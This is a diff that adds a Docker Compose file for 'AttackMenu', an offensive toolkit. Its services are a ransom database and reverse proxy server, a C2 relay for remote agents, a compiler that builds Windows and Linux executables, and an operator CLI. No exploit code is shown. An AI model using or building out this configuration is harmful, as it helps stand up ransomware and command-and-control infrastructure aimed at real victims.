@@ -1,0 +1,95 @@
+# docker-compose.yml — AttackMenu Production Stack
+#
+# Arquitetura:
+#   cli (TS/Ink) ──ws──→ py-server (Python :4445) ──→ DBs
+#                  └──ws──→ rb-server (Ruby :4444)  ──→ C2 Agents
+#                  └──────→ compiler (gcc/mingw)     ──→ .exe/.elf
+#
+# Uso:
+#   docker compose up -d py-server rb-server   # Sobe servers
+#   docker compose run --rm cli                # Roda CLI interativo
+#   docker compose --profile build run --rm compiler bash  # Compila manualmente
+#   docker compose down                        # Para tudo
+#   docker compose logs -f py-server           # Ver logs Python
+
+services:
+  # ── Python WS Server (Ransom DB + Proxy Reverso) ──────────────────────────
+  py-server:
+    build:
+      context: .
+      dockerfile: docker/py-server/Dockerfile
+    image: attackmenu-py
+    container_name: attackmenu-py-server
+    ports:
+      - "${PY_MANAGEMENT_PORT:-4445}:4445"
+      - "${PY_PROXY_PORT:-1212}:1212"
+    environment:
+      - KEY_CRIP_DATA=${KEY_CRIP_DATA:-}
+      - MANAGEMENT_PORT=4445
+      - AGENT_PORT=4444
+      - DEBUG=${DEBUG:-false}
+    volumes:
+      - ./rules.json:/app/rules.json:ro
+    networks:
+      - attackmenu
+    restart: unless-stopped
+
+  # ── Ruby C2 Relay Server ──────────────────────────────────────────────────
+  rb-server:
+    build:
+      context: ./src-rb
+      dockerfile: Dockerfile
+    image: attackmenu-rb
+    container_name: attackmenu-rb-server
+    ports:
+      - "${RB_WS_PORT:-4444}:4444"
+      - "${RB_HTTP_PORT:-8080}:8080"
+    environment:
+      - OPERATOR_TOKEN=${OPERATOR_TOKEN:-}
+      - RACK_ENV=production
+    networks:
+      - attackmenu
+    restart: unless-stopped
+
+  # ── Compiler (efêmero — gcc + mingw + OpenSSL) ────────────────────────────
+  compiler:
+    build:
+      context: .
+      dockerfile: docker/compiler/Dockerfile
+    image: compiler-image
+    container_name: attackmenu-compiler
+    volumes:
+      - ./compiler:/compiler
+    networks:
+      - attackmenu
+    profiles:
+      - build
+
+  # ── CLI Principal (TS + React Ink — interativo) ───────────────────────────
+  cli:
+    build:
+      context: .
+      dockerfile: docker/cli/Dockerfile
+    image: attackmenu-cli
+    container_name: attackmenu-cli
+    stdin_open: true
+    tty: true
+    env_file:
+      - .env
+    environment:
+      - PYTHON_WS_URL=ws://py-server:4445
+      - RUBY_WS_URL=ws://rb-server:4444
+      - EDGE_PATH=/usr/bin/chromium
+    volumes:
+      - ./compiler:/app/compiler
+      - ./output:/app/output
+      - ./secrets:/app/secrets
+    depends_on:
+      - py-server
+      - rb-server
+    networks:
+      - attackmenu
+
+networks:
+  attackmenu:
+    driver: bridge
